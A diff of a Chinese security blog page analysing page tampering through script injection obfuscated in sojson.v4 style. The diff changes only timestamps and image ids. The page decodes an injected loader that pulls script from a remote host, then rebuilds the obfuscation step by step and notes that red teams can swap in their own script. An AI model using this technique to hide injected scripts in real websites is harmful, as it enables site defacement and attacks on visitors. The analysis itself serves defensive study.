@@ -10,18 +10,18 @@
     <title>页面篡改分析-基于sojson.v4混淆的页面篡思路分析 - x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/index.xml" rel="alternate" type="application/rss+xml" title="页面篡改分析-基于sojson.v4混淆的页面篡思路分析 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1691255924" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691255924" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1691255924" rel="stylesheet">
-    <link href="/css/auto-complete.css?1691255924" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691255924" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1691255924" rel="stylesheet">
-    <link href="/css/fonts.css?1691255924" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691255924" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1691255924" rel="stylesheet">
-    <link href="/css/theme-auto.css?1691255924" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1691255924" rel="stylesheet">
-    <link href="/css/print.css?1691255924" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1691255924" rel="stylesheet">
-    <script src="/js/url.js?1691255924"></script>
-    <script src="/js/variant.js?1691255924"></script>
+    <link href="/css/fontawesome-all.min.css?1691256259" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691256259" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1691256259" rel="stylesheet">
+    <link href="/css/auto-complete.css?1691256259" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691256259" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1691256259" rel="stylesheet">
+    <link href="/css/fonts.css?1691256259" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691256259" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1691256259" rel="stylesheet">
+    <link href="/css/theme-auto.css?1691256259" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1691256259" rel="stylesheet">
+    <link href="/css/print.css?1691256259" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1691256259" rel="stylesheet">
+    <script src="/js/url.js?1691256259"></script>
+    <script src="/js/variant.js?1691256259"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -94,37 +94,37 @@
 <p>将e491q替换为sojson.v4</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>((([&#39;sojson.v4&#39;]+[])[&#34;constructor&#34;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;[&#39;split&#39;](/[a-zA-Z]{1,}/))))</code></pre></div><p>放在浏览器console中直接输出结果
 
-<a href="#image-a9e6b6abf5f3437c257919e520918549" class="lightbox-link">
+<a href="#image-3fe2d8fc8005196e407fda99d063e644" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a9e6b6abf5f3437c257919e520918549">
+<a href="javascript:history.back();" class="lightbox" id="image-3fe2d8fc8005196e407fda99d063e644">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>document.writeln(&#34;&lt;script src=\&#39;http[:]//sf[.]backmoon[.]xyz/js/jquery.min.php\&#39;&gt;&lt;/script&gt;&#34;);</code></pre></div><h2 id="分析">分析：</h2>
 <p>上面的代码个人理解实际相当于下面代码</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>&#39;&#39;.constructor.fromCharCode.apply(null,&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;.split(/[a-zA-Z]{1,}/))</code></pre></div><p>进一步实际关键代码，将字符数组进行混淆
 
-<a href="#image-a5ff7553a7ab3dff31b9bf4545aa9fd9" class="lightbox-link">
+<a href="#image-51ab7a3f1ccfb19102cedb47a6bbc071" class="lightbox-link">
 <img src="20200814161400.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a5ff7553a7ab3dff31b9bf4545aa9fd9">
+<a href="javascript:history.back();" class="lightbox" id="image-51ab7a3f1ccfb19102cedb47a6bbc071">
 <img src="20200814161400.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;.split(/[a-zA-Z]{1,}/)</code></pre></div><div class="wrap-code highlight"><pre tabindex="0"><code>[&#34;100&#34;, &#34;111&#34;, &#34;99&#34;, &#34;117&#34;, &#34;109&#34;, &#34;101&#34;, &#34;110&#34;, &#34;116&#34;, &#34;46&#34;, &#34;119&#34;, &#34;114&#34;, &#34;105&#34;, &#34;116&#34;, &#34;101&#34;, &#34;108&#34;, &#34;110&#34;, &#34;40&#34;, &#34;34&#34;, &#34;60&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;32&#34;, &#34;115&#34;, &#34;114&#34;, &#34;99&#34;, &#34;61&#34;, &#34;92&#34;, &#34;39&#34;, &#34;104&#34;, &#34;116&#34;, &#34;116&#34;, &#34;112&#34;, &#34;58&#34;, &#34;47&#34;, &#34;47&#34;, &#34;115&#34;, &#34;102&#34;, &#34;46&#34;, &#34;98&#34;, &#34;97&#34;, &#34;99&#34;, &#34;107&#34;, &#34;109&#34;, &#34;111&#34;, &#34;111&#34;, &#34;110&#34;, &#34;46&#34;, &#34;120&#34;, &#34;121&#34;, &#34;122&#34;, &#34;47&#34;, &#34;106&#34;, &#34;115&#34;, &#34;47&#34;, &#34;106&#34;, &#34;113&#34;, &#34;117&#34;, &#34;101&#34;, &#34;114&#34;, &#34;121&#34;, &#34;46&#34;, &#34;109&#34;, &#34;105&#34;, &#34;110&#34;, &#34;46&#34;, &#34;112&#34;, &#34;104&#34;, &#34;112&#34;, &#34;92&#34;, &#34;39&#34;, &#34;62&#34;, &#34;60&#34;, &#34;47&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;62&#34;, &#34;34&#34;, &#34;41&#34;, &#34;59&#34;]</code></pre></div><p>也就是：</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>String.fromCharCode(&#34;100&#34;, &#34;111&#34;, &#34;99&#34;, &#34;117&#34;, &#34;109&#34;, &#34;101&#34;, &#34;110&#34;, &#34;116&#34;, &#34;46&#34;, &#34;119&#34;, &#34;114&#34;, &#34;105&#34;, &#34;116&#34;, &#34;101&#34;, &#34;108&#34;, &#34;110&#34;, &#34;40&#34;, &#34;34&#34;, &#34;60&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;32&#34;, &#34;115&#34;, &#34;114&#34;, &#34;99&#34;, &#34;61&#34;, &#34;92&#34;, &#34;39&#34;, &#34;104&#34;, &#34;116&#34;, &#34;116&#34;, &#34;112&#34;, &#34;58&#34;, &#34;47&#34;, &#34;47&#34;, &#34;115&#34;, &#34;102&#34;, &#34;46&#34;, &#34;98&#34;, &#34;97&#34;, &#34;99&#34;, &#34;107&#34;, &#34;109&#34;, &#34;111&#34;, &#34;111&#34;, &#34;110&#34;, &#34;46&#34;, &#34;120&#34;, &#34;121&#34;, &#34;122&#34;, &#34;47&#34;, &#34;106&#34;, &#34;115&#34;, &#34;47&#34;, &#34;106&#34;, &#34;113&#34;, &#34;117&#34;, &#34;101&#34;, &#34;114&#34;, &#34;121&#34;, &#34;46&#34;, &#34;109&#34;, &#34;105&#34;, &#34;110&#34;, &#34;46&#34;, &#34;112&#34;, &#34;104&#34;, &#34;112&#34;, &#34;92&#34;, &#34;39&#34;, &#34;62&#34;, &#34;60&#34;, &#34;47&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;62&#34;, &#34;34&#34;, &#34;41&#34;, &#34;59&#34;)</code></pre></div><p>
-<a href="#image-a40fd9a7fb09b2b3a00b35555cfe0833" class="lightbox-link">
+<a href="#image-23d56a44725dfb16ccfe9bdfd2380d5d" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a40fd9a7fb09b2b3a00b35555cfe0833">
+<a href="javascript:history.back();" class="lightbox" id="image-23d56a44725dfb16ccfe9bdfd2380d5d">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h2 id="还原加密过程">还原加密过程：</h2>
 <p>这里修改篡改内容为百度，实际红队利用也可以改造自己的js</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>document.writeln(&#34;&lt;script src=\&#39;http://baidu.com\&#39;&gt;&lt;/script&gt;&#34;);</code></pre></div><p><a href="https://gchq.github.io/CyberChef/#recipe=To_Charcode%28%27Comma%27,10%29Find_/_Replace%28%7B%27option%27:%27Regex%27,%27string%27:%27,%27%7D,%27A%27,true,true,true,true/disabled%29&amp;input=ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCBzcmM9XCdodHRwOi8vYmFpZHUuY29tXCc%2BPC9zY3JpcHQ%2BIik7" target="_blank">to charcode 10进制</a>
-<a href="#image-a8586661770abe37af5daae5ca7c3528" class="lightbox-link">
+<a href="#image-252acd64310ebd001993e81230aece25" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a8586661770abe37af5daae5ca7c3528">
+<a href="javascript:history.back();" class="lightbox" id="image-252acd64310ebd001993e81230aece25">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>100,111,99,117,109,101,110,116,46,119,114,105,116,101,108,110,40,34,60,115,99,114,105,112,116,32,115,114,99,61,92,39,104,116,116,112,58,47,47,98,97,105,100,117,46,99,111,109,92,39,62,60,47,115,99,114,105,112,116,62,34,41,59</code></pre></div><p>替换所有&quot;,&ldquo;为随机[a-zA-Z]，这里直接全部替换A了</p>
@@ -132,10 +132,10 @@
 <div class="wrap-code highlight"><pre tabindex="0"><code>&#34;100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59&#34;.split(/[a-zA-Z]{1,}/)</code></pre></div><p>为了能够fromcharcode读取，传入参数需要调整，使用apply传入数组型参数，使用constructor对数组函数引用</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>&#39;&#39;.constructor.fromCharCode.apply(null,&#34;100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59&#34;.split(/[a-zA-Z]{1,}/))</code></pre></div><p>通过混淆变形即生成jsonv4代码</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>((([&#39;xxx随机&#39;]+[])[&#34;constructor&#34;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&#34;100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59&#34;.split(/[a-zA-Z]{1,}/))))</code></pre></div><p>
-<a href="#image-a4e16ae2d31ad7c411198af841940006" class="lightbox-link">
+<a href="#image-a583579a004f2730e7397f77177d3065" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a4e16ae2d31ad7c411198af841940006">
+<a href="javascript:history.back();" class="lightbox" id="image-a583579a004f2730e7397f77177d3065">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png" alt="" class="lightbox-image" loading="lazy">
 </a></p>
             <footer class="footline">
@@ -160,12 +160,12 @@
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1691255926" defer></script>
-        <script src="/js/lunr/lunr.min.js?1691255926" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1691255926" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1691255926" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1691255926" defer></script>
-        <script src="/js/search.js?1691255926" defer></script>
+        <script src="/js/auto-complete.js?1691256261" defer></script>
+        <script src="/js/lunr/lunr.min.js?1691256261" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1691256261" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1691256261" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1691256261" defer></script>
+        <script src="/js/search.js?1691256261" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -351,8 +351,8 @@
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1691255926" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1691255926" defer></script>
+    <script src="/js/clipboard.min.js?1691256261" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1691256261" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -382,15 +382,15 @@
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1691255926" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1691255926" defer></script>
+    <script src="/js/d3/d3-color.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1691256261" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1691256261" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -399,8 +399,8 @@
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691255926  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691256261  };
     </script>
-    <script src="/js/theme.js?1691255926" defer></script>
+    <script src="/js/theme.js?1691256261" defer></script>
   </body>
 </html>
